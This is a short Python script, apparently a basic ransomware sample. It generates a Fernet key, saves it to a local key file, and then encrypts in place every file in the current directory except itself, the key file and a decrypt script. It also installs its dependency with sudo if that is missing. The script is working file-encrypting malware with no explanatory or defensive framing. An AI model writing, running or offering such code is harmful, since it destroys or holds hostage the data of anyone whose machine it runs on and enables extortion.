import os
import subprocess
# List of required libraries to be installed
try:
    # Check if the library is installed
    __import__("cryptography")
except ImportError:
    # If the library is not installed, attempt to install it
    subprocess.check_call(["sudo","pip", "install", "cryptography"])
from cryptography.fernet import Fernet
key=Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
exclude_files = ["test.py", "thekey.key", "decrypt.py"]

for file in os.listdir():
    if file not in exclude_files:
        with open(file,"rb")as thefile:
            contents=thefile.read()
            contents_encrypted =Fernet(key).encrypt(contents)
        with open(file,"wb")as thefile:
            thefile.write(contents_encrypted)

   
           

    





